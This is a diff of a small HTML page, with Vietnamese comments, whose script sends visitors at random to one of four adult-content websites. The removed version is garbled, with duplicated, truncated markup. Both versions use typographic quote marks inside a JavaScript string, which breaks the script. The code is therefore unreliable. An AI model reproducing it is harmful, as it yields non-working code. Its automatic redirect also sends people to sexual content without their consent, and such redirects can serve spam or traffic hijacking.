@@ -1,64 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Redirect</title>
-    <script>
-        // Danh sách các URL để chuyển tiếp
-        const urls = [
-            "https://vlxx.my/",
-            "https://phimsexthiendia.org/vlxx/",
-            "https://quatvn.love/",
-            "https://vlgaimup.pro/“
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Redirect</title>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            // Danh sách các URL để chuyển tiếp
-            const urls = [
-            "https://vlxx.my/",
-            "https://phimsexthiendia.org/vlxx/",
-            "https://quatvn.love/",
-            "https://vlgaimup.pro/“
-            ];
-
-            // Chọn ngẫu nhiên một URL
-            const randomUrl = urls[Math.floor(Math.random() * urls.length)];
-
-            // Chuyển hướng sau 3 giây
-            setTimeout(function() {
-                window.location.href = randomUrl;
-            }, 3000);
-
-            // Hiển thị URL chuyển tiếp để kiểm tra
-            console.log("Sẽ chuyển hướng đến: " + randomUrl);
-        });
-    </script>
+<script type="text/javascript">
+var tungkhanh = new Array();
+tungkhanh[0] = "https://vlxx.my/";
+tungkhanh[1] = "https://phimsexthiendia.org/vlxx/";
+tungkhanh[2] = "https://quatvn.love/";
+tungkhanh[3] = “https://vlgaimup.pro/“;
+var random = Math.floor(Math.random()*tungkhanh.length);
+window.location = tungkhanh[random];
+</script>
 </head>
-<body>
-    <h1>Đang chuyển hướng...</h1>
-    <p>Hệ thống đang chọn ngẫu nhiên một trang web để chuyển tiếp.</p>
-    <p>Nếu không tự động chuyển, vui lòng thử lại hoặc <a href="#" id="redirect-link">nhấn vào đây</a>.</p>
-    <script>
-        // Cập nhật liên kết chuyển tiếp
-        document.addEventListener("DOMContentLoaded", function() {
-            const urls = [
-             "https://vlxx.my/",
-            "https://phimsexthiendia.org/vlxx/",
-            "https://quatvn.love/",
-            "https://vlgaimup.pro/“
-            ];
-            const randomUrl = urls[Math.floor(Math.random() * urls.length)];
-            document.getElementById("redirect-link").href = randomUrl;
-        });
-    </script>
-</body>
 </html>
